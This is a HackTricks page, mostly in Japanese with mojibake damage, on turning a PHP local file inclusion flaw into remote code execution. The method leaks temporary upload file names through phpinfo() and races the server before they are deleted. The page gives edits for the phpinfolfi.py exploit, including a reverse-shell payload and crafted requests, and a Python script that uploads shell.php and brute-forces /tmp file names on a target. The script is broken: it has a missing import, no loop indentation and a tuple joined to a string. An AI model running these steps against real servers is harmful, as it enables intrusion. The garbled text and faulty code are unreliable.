{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}


ã“ã®è„†å¼±æ€§ã‚’æ‚ªç”¨ã™ã‚‹ã«ã¯ã€**LFIè„†å¼±æ€§ã€phpinfo()ãŒè¡¨ç¤ºã•ã‚Œã‚‹ãƒšãƒ¼ã‚¸ã€"file\_uploads = on"ã€ãŠã‚ˆã³ã‚µãƒ¼ãƒãƒ¼ãŒ"/tmp"ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã«æ›¸ãè¾¼ã‚€ã“ã¨ãŒã§ãã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚**

[https://www.insomniasec.com/downloads/publications/phpinfolfi.py](https://www.insomniasec.com/downloads/publications/phpinfolfi.py)

**Tutorial HTB**: [https://www.youtube.com/watch?v=rs4zEwONzzk\&t=600s](https://www.youtube.com/watch?v=rs4zEwONzzk\&t=600s)

ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã‚’ä¿®æ­£ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼ˆ**=>**ã‚’**=>**ã«å¤‰æ›´ï¼‰ã€‚ãã®ãŸã‚ã«ã¯ã€æ¬¡ã®ã‚ˆã†ã«ã§ãã¾ã™ï¼š
```
sed -i 's/\[tmp_name\] \=>/\[tmp_name\] =\&gt/g' phpinfolfi.py
```
You have to change also the **payload** at the beginning of the exploit (for a php-rev-shell for example), the **REQ1** (this should point to the phpinfo page and should have the padding included, i.e.: _REQ1="""POST /install.php?mode=phpinfo\&a="""+padding+""" HTTP/1.1_), and **LFIREQ** (this should point to the LFI vulnerability, i.e.: _LFIREQ="""GET /info?page=%s%%00 HTTP/1.1\r --_ Check the double "%" when exploiting null char)

{% file src="../../.gitbook/assets/LFI-With-PHPInfo-Assistance.pdf" %}

### ç†è«–

ã‚‚ã—PHPã§ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ãŒè¨±å¯ã•ã‚Œã¦ã„ã¦ã€ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã—ã‚ˆã†ã¨ã™ã‚‹ã¨ã€ã“ã®ãƒ•ã‚¡ã‚¤ãƒ«ã¯ã‚µãƒ¼ãƒãƒ¼ãŒãƒªã‚¯ã‚¨ã‚¹ãƒˆã®å‡¦ç†ã‚’çµ‚ãˆã‚‹ã¾ã§ä¸€æ™‚ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã«ä¿å­˜ã•ã‚Œã€ãã®å¾Œã“ã®ä¸€æ™‚ãƒ•ã‚¡ã‚¤ãƒ«ã¯å‰Šé™¤ã•ã‚Œã¾ã™ã€‚

æ¬¡ã«ã€ã‚¦ã‚§ãƒ–ã‚µãƒ¼ãƒãƒ¼ã«LFIè„†å¼±æ€§ãŒè¦‹ã¤ã‹ã£ãŸå ´åˆã€ä¸€æ™‚ãƒ•ã‚¡ã‚¤ãƒ«ã®åå‰ã‚’æ¨æ¸¬ã—ã¦ã€å‰Šé™¤ã•ã‚Œã‚‹å‰ã«ä¸€æ™‚ãƒ•ã‚¡ã‚¤ãƒ«ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã¦RCEã‚’æ‚ªç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

**Windows**ã§ã¯ã€ãƒ•ã‚¡ã‚¤ãƒ«ã¯é€šå¸¸**C:\Windows\temp\php**ã«ä¿å­˜ã•ã‚Œã¾ã™ã€‚

**Linux**ã§ã¯ã€ãƒ•ã‚¡ã‚¤ãƒ«ã®åå‰ã¯**ãƒ©ãƒ³ãƒ€ãƒ **ã§ã€**/tmp**ã«ã‚ã‚Šã¾ã™ã€‚åå‰ãŒãƒ©ãƒ³ãƒ€ãƒ ã§ã‚ã‚‹ãŸã‚ã€ä¸€æ™‚ãƒ•ã‚¡ã‚¤ãƒ«ã®åå‰ã‚’**ã©ã“ã‹ã‹ã‚‰æŠ½å‡ºã™ã‚‹å¿…è¦ãŒã‚ã‚Š**ã€å‰Šé™¤ã•ã‚Œã‚‹å‰ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã¯ã€é–¢æ•°"**phpconfig()**"ã®å†…å®¹å†…ã§**å¤‰æ•°$\_FILES**ã®å€¤ã‚’èª­ã¿å–ã‚‹ã“ã¨ã§è¡Œã†ã“ã¨ãŒã§ãã¾ã™ã€‚

**phpinfo()**

**PHP**ã¯**4096B**ã®ãƒãƒƒãƒ•ã‚¡ã‚’ä½¿ç”¨ã—ã€**æº€æ¯**ã«ãªã‚‹ã¨**ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã«é€ä¿¡**ã•ã‚Œã¾ã™ã€‚æ¬¡ã«ã€ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã¯**å¤§ããªãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’ãŸãã•ã‚“é€ä¿¡**ï¼ˆå¤§ããªãƒ˜ãƒƒãƒ€ãƒ¼ã‚’ä½¿ç”¨ï¼‰ã—ã¦**php**ãƒªãƒãƒ¼ã‚¹**ã‚·ã‚§ãƒ«ã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰**ã—ã€**phpinfo()ã®æœ€åˆã®éƒ¨åˆ†ãŒè¿”ã•ã‚Œã‚‹ã®ã‚’å¾…ã¡**ï¼ˆä¸€æ™‚ãƒ•ã‚¡ã‚¤ãƒ«ã®åå‰ãŒã‚ã‚‹å ´æ‰€ï¼‰ã€LFIè„†å¼±æ€§ã‚’æ‚ªç”¨ã—ã¦phpã‚µãƒ¼ãƒãƒ¼ãŒãƒ•ã‚¡ã‚¤ãƒ«ã‚’å‰Šé™¤ã™ã‚‹å‰ã«**ä¸€æ™‚ãƒ•ã‚¡ã‚¤ãƒ«ã«ã‚¢ã‚¯ã‚»ã‚¹**ã—ã‚ˆã†ã¨ã—ã¾ã™ã€‚

**åå‰ã‚’ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ã™ã‚‹ãŸã‚ã®Pythonã‚¹ã‚¯ãƒªãƒ—ãƒˆï¼ˆé•·ã•=6ã®å ´åˆï¼‰**
```python
import itertools
import requests
import sys

print('[+] Trying to win the race')
f = {'file': open('shell.php', 'rb')}
for _ in range(4096 * 4096):
requests.post('http://target.com/index.php?c=index.php', f)


print('[+] Bruteforcing the inclusion')
for fname in itertools.combinations(string.ascii_letters + string.digits, 6):
url = 'http://target.com/index.php?c=/tmp/php' + fname
r = requests.get(url)
if 'load average' in r.text:  # <?php echo system('uptime');
print('[+] We have got a shell: ' + url)
sys.exit(0)

print('[x] Something went wrong, please try again')
```
{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’é€ä¿¡ã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}
